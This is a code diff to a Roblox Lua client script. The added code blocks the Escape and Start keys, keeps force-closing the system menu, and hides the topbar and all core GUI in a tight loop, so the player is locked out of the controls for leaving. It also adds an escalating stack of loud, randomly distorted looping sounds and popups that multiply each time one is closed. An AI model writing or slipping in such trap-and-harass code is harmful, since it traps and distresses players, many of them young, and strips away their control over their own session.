@@ -1,6 +1,9 @@
 local Players       = game:GetService("Players")
 local RunService    = game:GetService("RunService")
 local SoundService  = game:GetService("SoundService")
+local GuiService    = game:GetService("GuiService")
+local StarterGui    = game:GetService("StarterGui")
+local ContextActionService = game:GetService("ContextActionService")
 
 local player = Players.LocalPlayer
 if not player then
@@ -31,6 +34,30 @@ local function mount(gui)
 	end
 end
 
+ContextActionService:BindActionAtPriority(
+	"M7_BlockEscape",
+	function() return Enum.ContextActionResult.Sink end,
+	false,
+	Enum.ContextActionPriority.High.Value + 1000,
+	Enum.KeyCode.Escape,
+	Enum.KeyCode.ButtonStart
+)
+
+pcall(function()
+	GuiService.MenuOpened:Connect(function()
+		pcall(function() GuiService:SetMenuIsOpen(false) end)
+	end)
+end)
+
+task.spawn(function()
+	while true do
+		pcall(function() GuiService:SetMenuIsOpen(false) end)
+		pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+		task.wait(0.05)
+	end
+end)
+
 local sw, sh = 1280, 720
 local function refreshViewport()
 	local cam = workspace.CurrentCamera
@@ -57,18 +84,60 @@ do
 end
 
 local SOUND_ID = "rbxassetid://131761138083978"
+local MAX_SOUNDS = 25
 local sounds = {}
+
 local function addSound()
+	if #sounds >= MAX_SOUNDS then return end
 	local s = Instance.new("Sound")
 	s.SoundId = SOUND_ID
-	s.Looped  = true
-	s.Volume  = 10
-	s.Parent  = SoundService
-	pcall(function() s:Play() end)
+	s.Looped = true
+	s.Volume = 10
+	s.PlaybackSpeed = 0.55 + math.random() * 1.1
+	s.Parent = SoundService
+	pcall(function()
+		s:Play()
+		local len = s.TimeLength
+		if len and len > 0 then
+			s.TimePosition = math.random() * len
+		else
+			s.TimePosition = math.random() * 5
+		end
+	end)
 	sounds[#sounds + 1] = s
 	return s
 end
-for _ = 1, 3 do addSound() end
+
+for _ = 1, 8 do addSound() end
+
+task.spawn(function()
+	local interval = 0.35
+	while true do
+		task.wait(interval)
+		addSound()
+		interval = math.max(0.05, interval * 0.92)
+	end
+end)
+
+task.spawn(function()
+	while true do
+		task.wait(0.15)
+		for i = 1, math.min(3, #sounds) do
+			local s = sounds[math.random(1, #sounds)]
+			if s and s.Parent then
+				pcall(function()
+					local len = s.TimeLength
+					if len and len > 0 then
+						s.TimePosition = math.random() * len
+					end
+					if math.random() < 0.35 then
+						s.PlaybackSpeed = 0.55 + math.random() * 1.1
+					end
+				end)
+			end
+		end
+	end
+end)
 
 local isBlack = true
 local timer   = 0
@@ -233,6 +302,7 @@ local function spawnPopup()
 		gui:Destroy()
 		task.spawn(spawnPopup)
 		task.spawn(spawnPopup)
+		task.spawn(spawnPopup)
 	end)
 end
 
@@ -243,14 +313,9 @@ end
 
 task.spawn(function()
 	local interval = 0.5
-	local n = 0
 	while true do
 		task.wait(interval)
 		spawnPopup()
-		n += 1
 		interval = math.max(0.03, interval * 0.96)
-		if n % 15 == 0 and #sounds < 8 then
-			addSound()
-		end
 	end
 end)
